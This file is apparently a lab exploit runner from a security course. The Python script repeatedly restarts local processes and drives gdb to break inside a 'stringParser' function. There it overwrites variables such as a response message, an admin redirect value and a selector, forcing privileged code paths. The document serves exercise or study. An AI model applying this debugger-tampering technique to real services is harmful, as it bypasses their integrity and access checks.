import subprocess
import os
import signal

#https://man7.org/linux/man-pages/man1/gdb.1.html
#https://interrupt.memfault.com/blog/advanced-gdb
#https://stackoverflow.com/questions/26770568/vs-with-the-test-command-in-bash

#./run.sh: kill M, P, RP, SP and starts M, P, SP
#./start.sh: starts RP

current_working_directory = "/home/isl/t1"
sleep_3_s = "sleep 3"
sleep_13_s = "sleep 13" 

spo = "set pagination off\n"
sbpo = "set breakpoint pending on\n"
sffmc = "set follow-fork-mode child\n"
salsp = "set auto-load safe-path\n"

break_sp = "b stringParser\n"

def write2process(process, command):
	process.stdin.write(command.encode())
	process.stdin.flush()

	
os.system('echo "KILL PROCESSES 1"')
os.system("pkill -9 gdb")
os.chdir(current_working_directory)
os.system("./run.sh")	
os.system(sleep_3_s)
os.system("pkill -9 string_parser")

exploit_process11 = subprocess.Popen(["gdb", "screen"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
os.system(sleep_3_s)

write2process(exploit_process11, spo)
write2process(exploit_process11, sbpo)
write2process(exploit_process11, sffmc)
write2process(exploit_process11, salsp)

os.system(sleep_3_s)
os.system("./start.sh")
os.system('echo "EXPLOIT 11 START"')
write2process(exploit_process11, break_sp)
write2process(exploit_process11, "b *0x7ffff74a81d2\n")
write2process(exploit_process11, "r sp_server.py\n")
write2process(exploit_process11, "c\n")
write2process(exploit_process11,'set M_response_cleartext = "<mes><action type=\\"key-update\\"/></mes>"\n')
write2process(exploit_process11, "c\n") 
write2process(exploit_process11, "q\n")
exploit_process11.stdin.close()
exploit_process11.stdout.close()
os.system(sleep_3_s)
os.system("pkill -9 string_parser")
os.system("pkill -9 gdb")
os.system("pkill -9 node")
os.system('echo "EXPLOIT 11 END"')

os.system(sleep_3_s)
os.system("./run.sh")	
os.system(sleep_3_s)
os.system("pkill -9 string_parser")

exploit_process12 = subprocess.Popen(["gdb", "screen"], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
os.system(sleep_3_s)

write2process(exploit_process12, spo)
write2process(exploit_process12, sbpo)
write2process(exploit_process12, sffmc)
write2process(exploit_process12, salsp)

os.system(sleep_3_s)
os.system("./start.sh")
os.system('echo "EXPLOIT 12 START"')

write2process(exploit_process12, break_sp)
write2process(exploit_process12, "b *stringParser+1554\n")
write2process(exploit_process12, "r sp_server.py\n")
write2process(exploit_process12, "c\n")
write2process(exploit_process12, "set var redirectAdmin = 0x7d316c\n")
write2process(exploit_process12, 'set var verifyer_second = "A"\n')
write2process(exploit_process12, "set var redeemselector = 3\n")
write2process(exploit_process12, "c\n")
write2process(exploit_process12, "q\n")

os.system(sleep_3_s)
exploit_process12.stdin.close()
exploit_process12.stdout.close()
os.system(sleep_3_s)
os.system("pkill -9 string_parser")
os.system("pkill -9 gdb")
os.system("pkill -9 node")
os.system('echo "EXPLOIT 12 END"')
os.system(sleep_13_s)



subprocess.Popen(
"""
echo "KILL PROCESSES 1" &&
pkill -9 gdb &&
cd /home/isl/t1 &&
./run.sh &&
echo "START ALL PROCESSES 1" &&
pkill -9 string_parser &&
sleep 3 &&
./start.sh &
sleep 3 &&
echo "EXPLOIT 1.1" &&
screen -Sdm exploit_11 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *0x7ffff74a81d2" -ex "r sp_server.py" -ex "c" -ex 'set M_response_cleartext = "<mes><action type=\\"key-update\\"/></mes>"' -ex "c" -ex "q"
echo "EXPLOIT 1.1 - END" &&

echo "KILL PROCESSES 2" &&
pkill -9 gdb &&
pkill -9 string_parser &&
cd /home/isl/t1 &&
./run.sh &&
echo "START ALL PROCESSES 2" &&
pkill -9 string_parser &&
sleep 3 &&
./start.sh &
sleep 3 &&

echo "EXPLOIT 1.2 - START" &&
screen -Sdm exploit_12 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *stringParser+1554" -ex "r sp_server.py" -ex "c" -ex "set var redirectAdmin = 0x7d316c" -ex 'set var verifyer_second = "A"' -ex "set var redeemselector = 3" -ex "c" -ex "q"
echo "EXPLOIT 1.2 - END" &&
sleep 10 &&
echo "KILL PROCESSES 3" &&
pkill -9 node &&
pkill -9 string_parser &&
pkill -9 gdb &&
echo "END"
""", cwd="/home/isl/t1", shell = True)
	



subprocess.Popen("""
cd /home/isl/t1
pkill -9 string_parser
pkill -9 node
./run.sh
pkill -9 string_parser
sleep 2 && ./start.sh &
screen -Sdm exploit_11 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *0x7ffff74a81d2" -ex "r sp_server.py" -ex "c" -ex 'set M_response_cleartext = "<mes><action type=\\"key-update\\"/></mes>"' -ex "c" -ex "q"
sleep 6
pkill -9 string_parser
sleep 3

sleep 2 && ./start.sh &
screen -Sdm exploit_12 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *stringParser+1554" -ex "r sp_server.py" -ex "c" -ex "set var redirectAdmin = 0x7d316c" -ex 'set var verifyer_second = "A"' -ex "set var redeemselector = 3" -ex "c" -ex "q"
sleep 6
pkill -9 string_parser
./run_string_parser.sh
""", shell=True)



subprocess.Popen(
"""
echo "KILL PROCESSES 1" &&
pkill -9 gdb &&
cd /home/isl/t1 &&
./run.sh &&
echo "START ALL PROCESSES 1" &&
pkill -9 string_parser &&
sleep 3 &&
./start.sh &
sleep 3 &&
echo "EXPLOIT 1.1" &&
screen -Sdm exploit_11 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *0x7ffff74a81d2" -ex "r sp_server.py" -ex "c" -ex 'set M_response_cleartext = "<mes><action type=\\"key-update\\"/></mes>"' -ex "c" -ex "q"
echo "EXPLOIT 1.1 - END" &&

echo "KILL PROCESSES 2" &&
pkill -9 gdb &&
pkill -9 string_parser &&
cd /home/isl/t1 &&
./run.sh &&
echo "START ALL PROCESSES 2" &&
pkill -9 string_parser &&
sleep 3 &&
./start.sh &
sleep 3 &&

echo "EXPLOIT 1.2 - START" &&
screen -Sdm exploit_12 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *stringParser+1554" -ex "r sp_server.py" -ex "c" -ex "set var redirectAdmin = 0x7d316c" -ex 'set var verifyer_second = "A"' -ex "set var redeemselector = 3" -ex "c" -ex "q"
echo "EXPLOIT 1.2 - END" &&
sleep 10 &&
echo "KILL PROCESSES 3" &&
pkill -9 node &&
pkill -9 string_parser &&
pkill -9 gdb &&
echo "END"
""", cwd="/home/isl/t1", shell = True)


subprocess.Popen(
"""
echo "KILL PROCESSES 1" &&
pkill -9 node &&
pkill -9 string_parser &&
pkill -9 gdb &&
#lsof -P -i -n | grep LISTEN &&
#pwd &&
cd /home/isl/t1 &&
#pwd &&
sleep 3 &&

echo "START ALL PROCESSES 1" &&
./run.sh &&
./start.sh &&

sleep 3 &&

echo "EXPLOIT 1.1" &&
screen -Sdm exploit_11 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *0x7ffff74a81d2" -ex "r sp_server.py" -ex "c" -ex 'set M_response_cleartext = "<mes><action type=\\"key-update\\"/></mes>"' -ex "c" -ex "q"
echo "EXPLOIT 1.1 - END" &&

sleep 10 &&
echo "KILL PROCESSES 2" &&
pkill -9 node &&
pkill -9 string_parser &&
pkill -9 gdb &&

sleep 3 &&

echo "START ALL PROCESSES 1" &&
./run.sh &&
./start.sh &&

sleep 3 &&

echo "EXPLOIT 1.2 - START" &&
screen -Sdm exploit_12 gdb -batch -ex "set pagination off" -ex "set breakpoint pending on" -ex "set follow-fork-mode child" -ex "set auto-load safe-path" -ex "b stringParser" -ex "b *stringParser+1554" -ex "r sp_server.py" -ex "c" -ex "set var redirectAdmin = 0x7d316c" -ex 'set var verifyer_second = "A"' -ex "set var redeemselector = 3" -ex "c" -ex "q"
echo "EXPLOIT 1.2 - END" &&
sleep 10 &&
echo "KILL PROCESSES 3" &&
pkill -9 node &&
pkill -9 string_parser &&
pkill -9 gdb &&
""", shell = True)

#sleep(3)
#
#def exe_command(command, process):
#	process.stdin.write(command)
#	process.stdin.flush()
#	
#def encoder(command):
#	return command.encode()
#	
#process1 = subprocess.Popen(["gdb", "screen"], stdin = subprocess.PIPE, stdout = subprocess.PIPE, cwd="/home/isl/t1")
#
#sleep(3)
#
#exe_command(process1, encoder("set auto-load safe-path"))
#exe_command(process1, encoder("follow-fork-mode child"))
#exe_command(process1, encoder("pagination off"))
#exe_command(process1, encoder("breakpoint pending on"))
#
#sleep(3)
#
#
#exe_command(process1, encoder("b *0x7ffff74a81d2"))
#exe_command(process1, encoder("b stringParser"))
#exe_command(process1, encoder("run sp_server.py"))
#exe_command(process1, encoder("c"))
#exe_command(process1, encoder('set M_response_cleartext = "<mes><action type=\"key-update\"/></mes>"'))
#exe_command(process1, encoder("c"))
